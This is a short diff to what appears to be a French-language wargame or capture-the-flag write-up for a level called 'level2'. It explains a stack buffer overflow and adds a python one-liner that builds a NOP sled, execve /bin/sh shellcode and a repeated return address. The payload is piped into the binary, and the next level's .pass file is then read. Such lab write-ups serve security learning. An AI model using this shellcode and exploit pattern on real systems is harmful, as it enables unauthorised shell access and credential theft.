@@ -19,6 +19,10 @@ objdump -d level2 | grep call
 on dois faire attention a ne pas depasser 64 pour le buffer du shellcode car
 0x4c - 0xc = 64 ensuite on remplis l'adresse jusqu'a l'overflow
 
+notre shellcode fait 25 de long, le buffer fait 64, il reste donc 39 octects a
+remplire par des \x90 (instruction nop), dans l'overflow on colle l'addresse
+du debut de notre buffer (les \x90).
+
 python -c 'print "\x90"*39+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\x85\xeb"[::-1]*6' > /tmp/xploit
 cat /tmp/xploit - | ./level2
 cat /home/user/level3/.pass
